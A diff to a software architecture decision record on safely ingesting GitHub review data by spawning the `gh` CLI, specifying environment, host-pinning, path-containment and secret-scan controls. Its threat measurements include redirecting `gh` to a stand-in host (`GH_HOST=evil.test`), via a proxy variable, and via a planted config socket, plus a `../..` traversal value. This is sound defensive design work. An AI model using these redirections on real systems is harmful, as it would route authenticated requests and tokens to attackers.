@@ -8,8 +8,11 @@
 - Decision recorded in
   [#479](https://github.com/theurian/theurian/issues/479), the Milestone 8
   design-first step for the FR-V GitHub-API arm
-- Situates against [ADR-0004](0004-sqlite-is-a-derived-artifact.md) (what makes a
-  SQLite file safe to delete), [ADR-0013](0013-ai-writes-produce-proposals.md)
+- Situates against [ADR-0004](0004-sqlite-is-a-derived-artifact.md) — whose
+  *Never Git-tracked (derived)* list named "raw GitHub review caches", and which
+  this ADR amends in place: decision 3 withdraws that entry and adds a fourth
+  category, ingested content that is authored upstream and not rebuildable —
+  [ADR-0013](0013-ai-writes-produce-proposals.md)
   (nothing ingested here becomes approved knowledge),
   [ADR-0019](0019-front-matter-is-data-not-governance.md) (ingested labels are
   data, not governance), [ADR-0026](0026-evidence-plane-not-control-plane.md) (a
@@ -29,13 +32,18 @@ confined to `docs/`.
 
 **Two measurement frames, kept apart on purpose.**
 
-1. **The `gh` behaviour measurements** — runs A, B and C in decision 1, the
-   GraphQL introspection in decision 5, and the configuration-key observation in
-   decision 1 — **were taken during the design consult on 2026-09-05 against
-   `gh` 2.86.0, and are quoted here rather than re-run.** This document's own
-   change performs no network call at all. They therefore say what was true of
-   that binary on that date; slice 1 re-runs them as driving tests, which is
-   where they stop being quotations and become a control.
+1. **The measurements that needed the network are quoted, never re-run here** —
+   this document's own change performs no network call at all. Two sources, each
+   named where it is used, both on **2026-09-05** against **`gh` 2.86.0**:
+
+   | Source | Members |
+   | :-- | :-- |
+   | The design consult | runs **A**, **B**, **C** (decision 1); the `PullRequestReviewThread` schema introspection (decision 5); the configuration-key observation, `http_unix_socket` versus `api_host` (decision 1); the last-40-merged thread count (*Dispositions*) |
+   | Round one's adversarial review | runs **D**, **E**, **F** (decision 1), of which **D** was re-run by the orchestrator and reproduced; the by-PR-number thread population (*Dispositions*), also re-run by the orchestrator |
+
+   They say what was true of that binary and that repository on that date. Slice 1
+   re-runs A–F as driving tests, which is where they stop being quotations and
+   become controls.
 2. **Every repository measurement** was taken on 2026-09-05 against `origin/main`
    @ `1fe3302b`, and each names the command that produced it. Where a
    measurement is a *population*, the key is stated beside the number so a reader
@@ -56,11 +64,12 @@ design". This ADR is that arm's design.
 | :-- | :-- | :-- |
 | The `ReviewProvider` GitHub adapter | `cat packages/theurian-core/src/theurian/infrastructure/github/__init__.py` | a package docstring that says "**Not implemented.** This package holds no adapter and no HTTP client" |
 | The capability the server publishes | `grep -n 'reviewIngestion' packages/theurian-core/src/theurian/mcp/tools.py` | `"reviewIngestion": False` (line 1905) |
-| The allowlist key | `git grep -n 'providers.review.repositories' -- packages/theurian-core/src` | one hit, in `security/project_config.py`'s own prose; no reader |
+| The allowlist key | `git grep -n 'providers\.review\.repositories' -- packages/theurian-core/src` | **2** hits, both in `security/project_config.py`'s own docstring prose (`:5`, `:11`) — no reader anywhere |
 | The tool names already published as planned | the planned-tools table in `docs/protocol/mcp-tools.md`, lines 352–358 (command and output in *Compliance*) | **7** rows — `review.findings` shipped, six planned, `review.search` among them |
 | Places in the shipped package that can start another program | the pinned set in `tests/unit/test_network_call_sites.py` (`PROCESS_SPAWN_SITES`) | **3**: `cli/context.py`, `infrastructure/git/trailer_source.py`, `infrastructure/services/runner.py` — none of them reaches a network |
 
-**T-7 has had the wrong owner twice, and this is the change that ends that.**
+**T-7 has had the wrong owner twice, and the change that ends that is slice 1 —
+not this document, which ships nothing and can only name the owner.**
 `docs/security/threat-model.md` records three controls for SSRF — a scheme
 allowlist, private-network rejection, and the repository allowlist in
 `.theurian/config.yaml` — and none of the three is built.
@@ -71,8 +80,9 @@ corrected the entry's *wording*; the audit then repointed the controls at
 words: **"an owner has to be the change that would implement the control, and an
 epic in the right milestone is not automatically that."**
 [#429](https://github.com/theurian/theurian/issues/429) now holds the three
-against whatever first performs an external fetch. This ADR's slice 1 *is* that
-change, for one of the three.
+against whatever first performs an external fetch. Slice 1 *is* that change for
+the `gh` activation context, where it discharges two of the three; *Dispositions*
+states which two, in which context, and what stays #429's.
 
 **What stands in for the controls today is an absence, and the first spawn site
 deletes it.** `tests/unit/test_network_call_sites.py` pins, by equality against
@@ -106,7 +116,7 @@ replacement, stated in the positive.
 
 The adapter reaches GitHub by spawning the operator's `gh` binary as an argument
 vector. The absence control retires at the commit that adds the site, and the
-nine clauses below take its place. **Each clause is a property, and each owes a
+ten clauses below take its place. **Each clause is a property, and each owes a
 test that goes RED when it stops holding** — an invariant with no test is what
 the absence was already better than.
 
@@ -115,12 +125,13 @@ the absence was already better than.
 | 1 | **Exactly one module may reach GitHub.** The spawn site lives in `infrastructure/github/`, and the pinned spawn-site set grows by exactly that one entry. | A second fetch path added later on a page nobody re-reads; the equality pin catches an addition *and* a removal. | The existing `PROCESS_SPAWN_SITES` equality assertion, extended by one entry, plus a test that no other module in the shipped package names the adapter's spawn helper. Slice 1. |
 | 2 | **The endpoint is the literal `graphql`.** Repository identity travels as typed GraphQL variables, never in the URL position. | The `gh api <path>` form interpolates caller data into a path; the GraphQL form has no path segment an owner or repo name can escape into. It also means no raw URL exists for T-7's scheme allowlist to be needed on. | A test that the argument vector's endpoint element equals `graphql` byte-for-byte, and that no element is derived by string-formatting a repository name. Slice 1. |
 | 3 | **The destination host is pinned by an explicit `--hostname github.com`.** | An inherited `GH_HOST` silently moving the request to another host — measured to move it (run B). | A test asserting the flag and its value are present in every spawned vector. Slice 1. |
-| 4 | **The child environment is CONSTRUCTED from an explicit allowlist** (`env={...}` passed to the spawn), never inherited and never merely scrubbed. | The measured attack class below: *destination and identity taken from inherited environment*. A scrub is a blocklist, and a blocklist has to be right about every variable `gh` and its transport stack read; a constructed environment has to be right about the few Theurian deliberately passes. | A test that the spawn is called with an explicit `env` mapping whose keys equal a named constant, and a negative test that a destination-bearing variable set in the parent does not appear in the child. Slice 1. |
+| 4 | **The child environment is CONSTRUCTED from a closed enumerated constant** (`env={...}` passed to the spawn), never inherited and never merely scrubbed. The membership is fixed below, not left to slice 1. | The measured attack class below: *destination and identity taken from inherited environment*. A scrub is a blocklist, and a blocklist has to be right about every variable `gh` and its transport stack read; a constructed environment has to be right about the few Theurian deliberately passes. | **(i)** an **equality** test — the child's environment mapping equals the enumerated constant exactly, so the absence of `GH_HOST`, `GH_REPO`, the `GH_TOKEN` family and the proxy family follows from equality rather than from a list of names somebody remembered; **(ii)** a **run-D-shaped positive control** — an isolated config directory carrying `http_unix_socket`, reached through a forwarded config-locating variable, moves the request. Without (ii), (i) passes vacuously the moment `env={...}` is used at all. Slice 1. |
 | 5 | **The `gh` binary is resolved to an absolute path, and the vector is passed with `shell=False`.** | SEC-9 verbatim: "Never build a shell command by string concatenation. `git` and `gh` are invoked as argument vectors with `shell=False`" (`requirements-analysis.md:236`). An unresolved name would also let the child's `PATH` choose the executable; clause 4 means whatever `PATH` the child sees is one this project constructed, and clause 5 means it is not consulted for the executable at all. | A test that the first vector element is an absolute path and that `shell=True` appears nowhere in the module. Slice 1. |
 | 6 | **No `--paginate`.** Every page after the first is requested by handing back a GraphQL cursor in a typed variable, with the vector otherwise unchanged. | `--paginate` exists to follow a next-page reference the **response** supplies. Exactly what it follows, and how, is behaviour of a binary this design does not pin (clause 8 bounds only its version) — and that is the reason the flag is excluded rather than characterised: a destination the response chooses is the shape T-7 names, and a cursor in a typed variable cannot become one. | A test that `--paginate` is absent from every spawned vector, and a cursor-pagination test over a recorded fixture. Slice 1. |
 | 7 | **A request timeout (SEC-19) and recorded ingest cost bounds: a page cap and a PR-count cap, each a named constant.** Exceeding a cap is a reported, graded stop, never a silent truncation and never an unbounded loop. | A caller — or a large repository — making the system spend work no recorded limit bounds. The severity table grades exactly that as HIGH, and [#26](https://github.com/theurian/theurian/issues/26)'s T-6 concurrency cap is the precedent for how such a bound is recorded: a constant, a test, and prose that names the number. | A test per cap that the constant is the value the adapter uses, and a test that a fixture exceeding the cap stops with a report. Slice 1. |
 | 8 | **A `gh` version floor, expressed as a constant with a test, not as prose.** | `gh` is not a Python dependency, so [ADR-0014](0014-dependency-pinning-and-pre-1-0-isolation.md)'s exact pinning does not reach it; the behaviours clauses 2–6 rely on are flag and config behaviours of a binary the operator upgrades independently. Prose asking for "a recent gh" is not a control. | A test that the adapter refuses to spawn below the floor, and that the floor is the constant the refusal message names. Slice 1. Measured against 2.86.0 — the floor is chosen at implementation, not asserted here. |
-| 9 | **`gh` absent, or present and unauthenticated, is a graded refusal envelope with a remedy — never a traceback.** | The failure the product already has a shape for: `requirements-analysis.md:328-329` records `Degraded` as "a success-with-warnings terminal state, not a failure: a missing `gh` token must not prevent local knowledge from working." Ingestion is the optional capability; the rest of the product keeps working. | A test for each of the two states asserting a refusal envelope carrying a remedy, and that no traceback reaches the caller. Slice 1. |
+| 9 | **`gh` absent, or present and unauthenticated, is a graded refusal envelope with a remedy — never a traceback.** The child's stderr surfaces **only inside that envelope**, never straight to a log or a caller. | The failure the product already has a shape for: `requirements-analysis.md:328-329` records `Degraded` as "a success-with-warnings terminal state, not a failure: a missing `gh` token must not prevent local knowledge from working." Ingestion is the optional capability; the rest of the product keeps working. The stderr half is the `GH_DEBUG=api` shape — a debug-verbose child can print request detail, and the environment constant of clause 4 excludes `GH_DEBUG`, so the two halves close it together. | A test for each of the two states asserting a refusal envelope carrying a remedy and no traceback, and a test that child stderr reaches no sink outside the envelope. Slice 1. |
+| 10 | **A per-response byte cap, as a named constant, with a typed refusal when a response exceeds it — and the read shape that makes the cap real: the child's output is read incrementally against the cap, not accumulated first and measured after.** | An unbounded `capture_output` of third-party bodies is the same unbounded-work class clause 7 covers for request count, one layer down: a repository's comment bodies are content Theurian does not control. The product already records a bar for a bounded read — `MAX_SOURCE_FILE_BYTES` (8 MiB, `security/paths.py:45`), used by `ingestion_service.py:180` — so the cap is set beside a recorded number rather than invented. | A test that a response past the constant is refused with the typed refusal and not truncated silently, and a test that the read does not buffer the whole response before deciding. Slice 1. |
 
 #### The attack class clause 4 exists for, measured
 
@@ -134,37 +145,80 @@ consistent with the threat not existing at all.
 | **B** | `GH_HOST=evil.test gh api graphql …` (no pin) | error connecting to `evil.test` — **the threat is real**, and A's result is a pin doing work rather than a variable being ignored |
 | **C** | `HTTPS_PROXY=http://127.0.0.1:9 gh api --hostname github.com graphql …` | `proxyconnect tcp: dial tcp 127.0.0.1:9` — **the pin does not cover this class**: the request was routed to loopback with the hostname pin in place |
 
-Run C is the reason clause 4 is *construction* and not *scrubbing of `GH_HOST`*.
-The destination is decided by more than one variable, the proxy family is a
-second one, and a defence that enumerates the variables an attacker may not set
-is a defence that must be complete. Constructing the environment inverts that: it
-must be complete about what Theurian deliberately passes, which is a set this
-project chooses and pins.
+Three further runs, quoted from the **adversarial review of 2026-09-05** (same
+binary, `gh` 2.86.0); run D was re-run by the orchestrator before this text was
+written and reproduced. They are recorded at the fidelity the round reported them
+— each run's shape and its result — and slice 1 re-runs them as clause 4's
+positive control:
 
-#### Two recorded decisions that come with this transport, stated as decisions
+| Run | Shape | Observed |
+| :-- | :-- | :-- |
+| **D** | `--hostname github.com` pinned, only allowlisted variables set, `GH_CONFIG_DIR` pointing at an isolated config directory whose config sets `http_unix_socket` | the request went to the unix socket |
+| **E** | the same config reached through `HOME` instead | the same |
+| **F** | the same config reached through `XDG_CONFIG_HOME` instead | the same |
+
+Runs B, C and D–F are each a positive control for a different half of clause 4: B
+shows the `GH_HOST` threat is real rather than ignored, C shows the `--hostname`
+pin does not reach the proxy family, and D–F show it does not reach the config
+file either. Together they are why clause 4 is *construction* and not *scrubbing
+of `GH_HOST`*: the destination is decided by at least three independent inputs,
+and a defence that enumerates what an attacker may not set has to be complete
+about all of them.
+
+#### The partition, stated so it survives runs D–F
+
+An earlier draft of this ADR split the environment as *a variable that can supply
+credentials may be passed, a variable that can move the destination may not*. **That
+split is not a partition** and it is retracted here rather than left standing: it
+admits the `GH_TOKEN` family (identity taken from the caller's environment, which
+is the second half of the very class clause 4 exists to close), and the
+config-locating variables it explicitly passed are destination-bearing by runs
+D–F. The rule that holds:
+
+> **A variable that can move the destination *without* moving the credential
+> source is excluded. The config-locating variables move both — they locate one
+> directory that holds the token and the transport settings together — so they
+> travel together, and the destination-moving reach they carry is a single
+> recorded residual of the rule itself.**
+
+**The closed enumerated constant.** The child environment is exactly:
+
+| Variable | Why it is in | |
+| :-- | :-- | :-- |
+| `HOME` | locates the operator's persisted `gh` login | forwarded **by value** from the parent |
+| `GH_CONFIG_DIR` | the same, when the operator sets it | forwarded by value |
+| `XDG_CONFIG_HOME` | the same | forwarded by value |
+| minimal operational variables (e.g. `NO_COLOR`) | machine-readable output, no destination or identity reach | forwarded by value |
+
+**Nothing else.** In particular `GH_TOKEN`, `GITHUB_TOKEN`, `GH_ENTERPRISE_TOKEN`
+and `GITHUB_ENTERPRISE_TOKEN` are **excluded**: identity comes from the operator's
+persisted `gh` login and never from a caller's environment. Headless
+environment-token authentication is therefore a **recorded non-goal** until
+somebody needs it — at which point it is a decision with its own reasoning, not a
+variable quietly added to this table.
+
+**The residual, stated against the rule and not only against config validation.**
+Runs D–F show what the three forwarded variables buy an attacker who can write the
+directory they locate: the request moves. (Measured on 2.86.0, `http_unix_socket`
+is a real configuration key while `api_host` is not — which is why this residual
+names the *class*, the transport settings that file carries, and not one key.)
+Theurian does not read, validate or override that config file, and the reason is
+that the attack requires a capability that already defeats the transport — **the
+same directory holds `hosts.yml`, and so the operator's token.** Whoever can write it can read the credential and make
+the request themselves; changing the destination buys them nothing they do not
+already have. That is the whole argument, and it is narrower than the one this
+paragraph used to make: an earlier draft said such an actor "can also replace the
+`gh` binary", which is false where `gh` is root-owned and the config directory is
+user-owned. The residual is recorded here so a later reader does not mistake
+silence for coverage, and clause 4's test (ii) keeps it *demonstrated* rather than
+asserted.
 
 **Theurian borrows the operator's ambient GitHub identity, and holds no token.**
-The allowlisted environment carries the credential-source variables `gh` needs to
-find the operator's existing authentication (the `HOME` / `GH_CONFIG_DIR`
-family). The consequence is stated plainly rather than filed as a footnote:
-ingestion runs with **whatever scopes the operator's `gh` login already has**,
+Ingestion runs with **whatever scopes the operator's `gh` login already has**,
 which may include private repositories. That is accepted, because the alternative
-is Theurian taking custody of a token (rejected in *Alternatives considered*),
-and because the control that keeps ingestion off private repositories is decision
-2's allowlist and its refusal — not the credential's reach. Slice 1 fixes the
-exact allowlist membership and pins it; the rule this ADR fixes is the split: a
-variable that can supply *credentials* may be passed, a variable that can move the
-*destination* may not.
-
-**`gh`'s own persisted configuration stays in the operator's trust domain.** A
-`gh` configuration file can change transport behaviour — measured on 2.86.0,
-`http_unix_socket` is a real configuration key (while `api_host` is not, which is
-why the decision names the *class* and not one key). Theurian does not read,
-validate, or override that file. The reason is a containment argument, not an
-oversight: an actor who can write the operator's `gh` config can also replace the
-`gh` binary that the adapter spawns, so a check there buys nothing a
-determined-local-attacker model does not already concede. It is recorded as an
-accepted residual so that a later reader does not mistake silence for coverage.
+is Theurian taking custody of a token (rejected in *Alternatives considered*), and
+because the control that keeps ingestion off private repositories is decision 2's
+allowlist and its refusal — not the credential's reach.
 
 ### 2. Scope: public allowlisted repositories only, and the argument is an audience argument
 
@@ -175,12 +229,17 @@ an array of strings matching `^[\w.-]+/[\w.-]+$`, beside a
 description says "Not in force… Nothing reads it today", and slice 1 is the change
 that makes both sentences false and rewrites them.
 
-Two refusals, both with synthetic-input driving tests owed to slice 1:
+Three refusals, each with a synthetic-input driving test owed to slice 1:
 
 1. **A repository not in the allowlist is refused before the process is
    spawned.** Not filtered after the fetch — the spawn does not happen.
 2. **A repository that resolves as private is refused at ingestion**, even if it
    is in the allowlist, and nothing about it is written.
+3. **The repository the response describes is checked back against the allowlisted
+   entry.** GitHub redirects a renamed `owner/repo`, so an allowlisted name can
+   resolve to a repository nobody allowlisted; the adapter compares the response's
+   resolved `nameWithOwner` and repository id against the entry it asked for and
+   refuses a mismatch. Owed a slice-1 test with a renamed-repository fixture.
 
 **The argument for public-only v1 is an audience argument, and it must be written
 narrowly.** The tempting sentence — "a public repository cannot carry embargoed
@@ -191,8 +250,9 @@ people are capable of putting such a thing where it does not belong. The true an
 narrower claim is:
 
 > Public-only v1 ingests **no advisory-private GitHub surface** (private
-> repositories, security advisories, private forks), and it serves only material
-> that is **already visible to the public repository's audience**.
+> repositories, security advisories, private forks), and every record it holds
+> was **visible to the public repository's audience at the moment it was
+> ingested**.
 
 That is the same structural shape ADR-0029 decision 6 records for public `main`:
 the protection is *structural* — the source has no access to the withheld
@@ -200,14 +260,30 @@ surface — and it is not a claim that the public surface is guaranteed clean. W
 guards the second half is unchanged from the rest of the product: the secret scan
 at ingestion (decision 4) and the untrusted-content triple at serve (decision 6).
 
-**The private-repository arm stays owed, and is named.** ADR-0029 assigned it to
-this arm: a finding marked `securityRelated` at ingestion time, where advisory
-state is available, then refused **uniformly** at serve — the refusal must not
-distinguish "an embargoed item exists and is withheld" from "no such item
-exists". Milestone 8 does not build it, and this ADR does not silently drop it: it
-is future work for the follow-up that adds private-repository ingestion, and it
-is listed again in *What this does not close* so a reader who skips this section
-still meets it.
+**The tense is load-bearing, and the residual it names is retention.** Decision 3
+makes the evidence files durable precisely so an upstream delete does not erase
+the record — which means *"visible to the public audience"* is true at ingestion
+time and can stop being true afterwards, when an author edits or deletes a
+comment upstream. This ADR does not pretend otherwise, and it does not build a
+propagation path either: an upstream delete does not reach Theurian's copy, and
+there is no mechanism that would notice one. **The remediation path exists and is
+manual**: delete the evidence file and rebuild the derived store, which is
+exactly the operation decision 3's files-as-source shape already supports (the
+store is rebuilt from the files, so removing a file removes the record from every
+surface). A capability that would make it automatic is not designed here and is
+listed in *What this does not close*.
+
+**The private-repository arm stays owed, and it keeps a named owner.** ADR-0029
+assigned it to this arm: a finding marked `securityRelated` at ingestion time,
+where advisory state is available, then refused **uniformly** at serve — the
+refusal must not distinguish "an embargoed item exists and is withheld" from "no
+such item exists". Milestone 8 does not build it, and this ADR does not hand it to
+an unnamed follow-up either: **it is owned by
+[#575](https://github.com/theurian/theurian/issues/575)**, the change that adds
+private-repository ingestion. ADR-0029's owed table is repointed to #575 in the
+same commit as this ADR, so the row and this paragraph cannot disagree — an
+owed item whose owner is "a follow-up" is the owner-position defect this document
+diagnoses twice elsewhere, and it is not repeated here.
 
 **The scope is machine-visible, not only prose.** `system.capabilities` today
 publishes `reviewIngestion: false` beside `reviewFindings: true`, and
@@ -218,8 +294,33 @@ the flag alone is not enough: a client that reads `reviewIngestion: true` and
 nothing else would conclude that review history is ingested wherever the operator
 points it. The decision is therefore **`reviewIngestion: true` plus a scope
 field** — proposed shape `reviewIngestionScope: "public-allowlisted"`, a string
-beside the booleans — flipped together at the serve slice, with the wire schema
-change that publishes them landing in slice 3.
+beside the booleans, which the capability block already does elsewhere
+(`knowledgeSearch: "hybrid"`, `mcp/tools.py:1868`) — flipped together at the serve
+slice, with the wire schema change that publishes them landing in slice 3.
+
+**The flag's published meaning narrows, and that redefinition is stated here
+rather than performed quietly.** Today `reviewIngestion: false` is read as *this
+build cannot reach GitHub*, and four documents plus two tests lean on exactly that
+reading. From slice 3 the flag means *an ingestion call surface exists that a
+client may call* — a narrower promise, because the fetch path will have shipped
+two slices earlier while the flag was still `false`. Redefining a published flag
+without moving what cites it is how a security statement becomes false, so
+**slice 1 rewrites every site that records the old meaning, by name**:
+
+| Site | What it says today |
+| :-- | :-- |
+| `docs/security/threat-model.md:1703` | "`system.capabilities` reports `reviewIngestion: false`, pinned by `test_capabilities_report_what_is_and_is_not_built`" |
+| `docs/security/threat-model.md:1712-1715` | the flag "that has to move before this entry's controls become load-bearing" is `reviewIngestion` |
+| `docs/protocol/mcp-tools.md:346-348` | "`reviewIngestion` is the one that reaches GitHub" |
+| `docs/roadmap.md:46-51` | "still `false`: nothing reaches GitHub" |
+| `packages/theurian-core/tests/integration/test_mcp_tools.py:2060-2064` (docstring) | "a capability flag is a security statement when it is `reviewIngestion`, because T-7's threat-model entry cites its `false` as what stands in for the repository allowlist" |
+| `packages/theurian-core/src/theurian/mcp/tools.py` (the inline capability comment beside the flag) | the same split, in the code that publishes it |
+
+All six move in slice 1 — the slice that ships the fetch path — so no on-main
+sentence ever reads the `false` as an absent fetch path while one ships. The flag
+itself does not flip until slice 3, because until then there is nothing for a
+client to call; the two facts are separated in the documents rather than papered
+over by moving the flip.
 
 ### 3. Evidence files are the source; SQLite is derived
 
@@ -250,9 +351,38 @@ source." Review evidence has no such replayable source. So:
 
 | Artifact | Why deleting it is safe | Layer ([ADR-0010](0010-three-layer-knowledge-model.md)) |
 | :-- | :-- | :-- |
-| Review-finding store (ADR-0029) | git history is replayable | Canonical, projected from git |
-| **Review evidence files (this ADR)** | **nothing — they are the source** | **Source** |
+| Review-finding store (ADR-0029) | git history is replayable | **Canonical**, projected from git |
+| **Review evidence files (this ADR)** | **nothing outside Theurian can reproduce them** | **Canonical**, carrying a `SourceAnchor` — but with **no replayable source** |
 | Review serving store (slice 3) | rebuilt from the evidence files | Index / derived |
+
+**The middle row is a case ADR-0010's three layers do not have, and it is named
+rather than forced into one of them.** The bytes GitHub returned are Source; what
+lands on disk is a *normalized record Theurian wrote*, which is the same operation
+ADR-0029 places in **Canonical** — so putting the evidence files in Source would
+contradict that precedent for an identical act. What makes them unlike every other
+Canonical artifact is the property in the middle column: `findings_schema.py` says
+the findings store is safe to delete because "the source of truth is **git
+history** … and this file is reconstructed wholesale by replaying the git source",
+and review evidence has **no such replay**. So this is a Canonical record whose
+own source is not re-readable — the fourth-category case ADR-0004's Milestone 8
+amendment records — and it carries a `SourceAnchor` (FR-S3) naming the upstream
+object it came from, precisely because that anchor is the only remaining pointer
+to material Theurian can no longer re-fetch.
+
+**Paths are built from ids, never from allowlist strings.** An evidence file's
+path is derived from **provider-generated identifiers, or a hash of the repository
+identity** — never by joining the configured `owner/repo` string into a
+filesystem path. The reason is measurable today: the schema pattern
+`^[\w.-]+/[\w.-]+$` accepts `../..`, so a joined path escapes the directory while
+satisfying the config schema. Two controls, both owed:
+
+- **Every write resolves through `security/paths.py`'s containment**
+  (`resolve_within_root`, `assert_no_symlink_escape`) — the same SEC-7 containment
+  the rest of the product uses, applied to the *write* path and not only to a
+  served `filePath` field.
+- **The schema pattern is tightened to reject `.` and `..` segments**, and that
+  tightening lands in slice 1's allowlist-reader commit — the commit that first
+  makes the key load-bearing is the commit that makes its values safe.
 
 **Refetch is a best-effort refresh, never the durability story.** A later
 ingestion run updates what upstream still returns and does not delete what it no
@@ -262,7 +392,43 @@ the project's decision — the directory is not written into the ignore block. W
 lands in it is also subject to the configurable ingestion-time redaction
 review-knowledge.md's Privacy section describes, which is design and not shipped
 behaviour: no review ingestion path exists to perform it — the GitHub package
-holds no adapter, measured in *Context* — and this ADR does not build it.
+holds no adapter, measured in *Context* — and **it is slice 2's, applied at
+landing, beside the scan gate**, since both are decisions about what a file may
+contain before it is written.
+
+#### The evidence record's field set, enumerated once
+
+The scan gate (decision 4) and the serving trust table (decision 6) need the same
+population, so it is written here once. Every field FR-V1 names is listed with
+**who controls its value** — which decides both whether the scan reads it and
+which side of the trust boundary it is served on:
+
+| Field | Controlled by | Trust class | Read by the ingestion scan |
+| :-- | :-- | :-- | :-- |
+| repository `owner/name`, PR number, event key, review / thread / comment ids | the provider | structural | no — no free text |
+| thread state, resolution state, `isResolved` / `isOutdated`, timestamps, diff side, line numbers | the provider | structural | no |
+| head, fix and merge commit shas; linked issue numbers; CI rollup outcome | the provider | structural | no |
+| participant `external_id` | the provider | structural | no |
+| **comment body, review body, PR title, PR description** | the author | **untrusted** | **yes** |
+| **participant `display_name`** | the author | **untrusted** | **yes** |
+| **file path as received** | the author (whoever named the file in the PR) | **untrusted** | **yes** |
+| **labels, head branch name, milestone name** | the author | **untrusted** | **yes** |
+
+**Author-controlled *structural-looking* metadata is on the untrusted side, and
+that is the row most easily got wrong.** A label, a branch name and a milestone
+name look like provider structure and are not: anyone who can open a pull request
+chooses them, so they carry text a person wrote and ride under the same safety
+triple as a comment body.
+
+**This is where [ADR-0019](0019-front-matter-is-data-not-governance.md) is
+discharged rather than merely cited: an ingested label is data, and it governs
+nothing.** A record labelled `security` upstream is not thereby security-related
+to Theurian; no serving decision, no refusal and no ranking reads a label's value.
+The marking that *would* carry weight — `securityRelated` — is
+[#575](https://github.com/theurian/theurian/issues/575)'s, and it is computed at
+ingestion from advisory state, never read off an author-chosen label. A design
+that let a label decide what is withheld would hand the withholding decision to
+whoever opened the pull request.
 
 ### 4. The secret scan runs at ingestion, per record, like `propose accept`
 
@@ -286,9 +452,23 @@ rather than refuses:
 > ever.
 
 That premise is false pre-landing. Review ingestion runs **before** the content
-exists anywhere in Theurian, so refusing genuinely un-discloses: nothing is
-written, nothing is served, and the operator still has the upstream comment where
-it always was. The gate that matches is ADR-0027's — validate before you move.
+exists anywhere in Theurian, so refusing genuinely un-discloses **relative to
+Theurian's own surfaces**: nothing is written, so nothing is served, indexed,
+ranked or reachable through any tool. The gate that matches is ADR-0027's —
+validate before you move.
+
+**What `block` costs, stated rather than assumed.** Refusal is not free, and the
+cost is not symmetric with the build's. Upstream may already have edited or
+deleted the comment by the next run (decision 2's retention residual, in the other
+direction), so a record refused at ingestion — including on a **false positive**,
+and the detector is best-effort entropy heuristics by its own admission — may be
+evidence Theurian never gets another chance to hold. That is accepted, with the
+reason named: **a landed credential is worse than a gap in the evidence.** A gap
+is visible in the ingest report and recoverable by re-running with `warn` after a
+human has looked; a landed secret is a disclosure through every serving surface
+the moment it is written, and no later policy change un-writes it. Operators who
+weigh those differently have `warn`, which is why the policy is a setting and not
+a constant.
 
 The report names the *record* (repository, PR number, thread and comment id), not
 the matched bytes, for the reason `index_secret_scan.py` gives about pasted
@@ -312,7 +492,8 @@ guarantee. Three fields, two of them changing, all slice 1 work:
 | :-- | :-- | :-- | :-- |
 | `resolved_at` | `datetime` (required) | `datetime \| None` | **No resolution timestamp exists on the API object.** |
 | `resolved_by` | `ReviewParticipant` (required) | `ReviewParticipant \| None` | `resolvedBy` is nullable — a thread can be resolved with no participant recorded. |
-| `ci_successful` | `bool \| None` | unchanged | `None` already means *unknown*, and that is the honest value for a PR with no status rollup. |
+| `ReviewEvent.ci_successful` | `bool \| None` (`domain/review.py:61`) | unchanged | `None` already means *unknown*, and that is the honest value for a PR with no status rollup. |
+| `PromotionGate.ci_successful` | required `bool` (`domain/review.py:152`) | **not touched by Milestone 8** | The gate is candidate-generation machinery, which is out of scope (below). `None` is unrepresentable there today, so *how the gate should treat unknown* is a real open question — assigned to the candidate-generation design, not answered here. |
 
 **The measurement, quoted from the design consult (2026-09-05, GraphQL schema
 introspection).** `PullRequestReviewThread`'s fields are:
@@ -348,15 +529,25 @@ on `ReviewThread`. There is no consumer to migrate. The CHANGELOG entry for slic
 "no consumer exists" answers the migration cost and not the question of whether
 the record is honest.
 
-**`ci_successful`'s mapping is a rule, not a measured enum.** The adapter maps the
-PR's status rollup to the tri-state as: a definite success → `True`; a definite
-failure or error → `False`; **anything else — pending, expected, absent, or a
-value this version of the adapter does not recognise — → `None`.** The mapping is
-stated by semantics rather than by enumerating the API's enum members, because
-this ADR did not measure that enum; slice 1 pins the member list against the
-schema at implementation time. The load-bearing half is the default: an
-unrecognised value becomes *unknown*, never *failed*, so a promotion gate never
-reads a shrug as a verdict.
+**`ReviewEvent.ci_successful`'s mapping is a rule, not a measured enum.** The
+adapter maps the PR's status rollup to the tri-state as: a definite success →
+`True`; a definite failure or error → `False`; **anything else — pending,
+expected, absent, or a value this version of the adapter does not recognise — →
+`None`.** The mapping is stated by semantics rather than by enumerating the API's
+enum members, because this ADR did not measure that enum; slice 1 pins the member
+list against the schema at implementation time. The load-bearing half is the
+default: on the ingested record, an unrecognised value becomes *unknown*, never
+*failed*.
+
+**That is a statement about the ingested record and not about the gate.**
+`PromotionGate.ci_successful` is a required `bool`, and `is_satisfied` / `unmet()`
+read it as a verdict — so an unknown handed to *that* type has already been
+flattened into `True` or `False` by whoever constructed it. Milestone 8 constructs
+no gate (candidate generation is out of scope), which is why this ADR does not
+change the type and does not claim the gate is safe from a shrug. Deciding whether
+the gate gains a tri-state, refuses construction on unknown, or treats unknown as
+unmet is the candidate-generation design's, and it is listed in *What this does
+not close*.
 
 **Candidate generation is out of Milestone 8.** FR-V2 classification and FR-V3
 `KnowledgeCandidate` generation are the write-path half of Phase B: they are
@@ -365,6 +556,16 @@ that ingestion does not. They are filed and sequenced, not folded in. **FR-V5 is
 satisfied structurally rather than by a fallback path: no model exists anywhere in
 the ingest path**, so raw ingestion cannot be broken by candidate generation
 failing.
+
+That sentence is a universal, and its authority is a test that does not exist yet,
+so it is named here as owed rather than left standing on a reading: **slice 2 owes
+a walk of the ingest path's modules asserting that none reaches an embedding,
+summarization or reranking provider.** The precedent for the shape is
+`test_no_registered_tool_can_reach_a_canonical_write`
+(`tests/integration/test_mcp_tools.py:2357`), which walks bytecode rather than
+source for ADR-0013's equivalent claim — a name-based scan cannot see a provider
+resolved through a factory, and the ingest path has one available. Until that test
+lands, the sentence is a design intent with a named owner, not a measured property.
 
 ### 6. Serving is `review.search`, under the SEC-15 triple, with its own disclosure round
 
@@ -376,18 +577,25 @@ contract, and the table has been publishing this one as planned.
 **Every body-derived field is untrusted content (T-3, SEC-15); only structural
 fields are validated and normalized.**
 
-| Served field | Origin | Trust |
-| :-- | :-- | :-- |
-| comment body, PR or thread title, participant display name, file path *as received* | authored by whoever opened the PR or wrote the comment | **untrusted** — carries `contentClassification: untrusted-knowledge`, `mayContainInstructions: true`, `executable: false` |
-| thread state, resolution state, timestamps, line numbers, repository, PR number, provider ids | generated by the provider | validated and normalized |
+**The population is decision 3's field table, not a second list.** Its
+*Controlled by* column decides the side: every **author**-controlled field —
